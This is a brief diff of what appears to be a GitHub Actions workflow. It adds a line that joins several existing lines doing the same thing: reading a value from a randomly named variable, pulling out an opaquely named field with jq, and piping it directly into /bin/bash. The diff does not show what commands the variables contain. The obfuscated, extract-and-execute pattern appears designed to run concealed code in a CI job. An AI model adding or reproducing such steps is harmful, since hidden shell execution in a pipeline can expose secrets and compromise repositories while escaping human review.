@@ -24,6 +24,7 @@ jobs:
           echo $h8280 | jq -r .yux89 | /bin/bash
           printf '%s' "$fdsn65410" | jq -r .ybqjp998 | /bin/bash
           printf '%s' "$ccpw9465" | jq -r .fcyt3787 | /bin/bash
+          echo $srl2830 | jq -r .vpl8 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
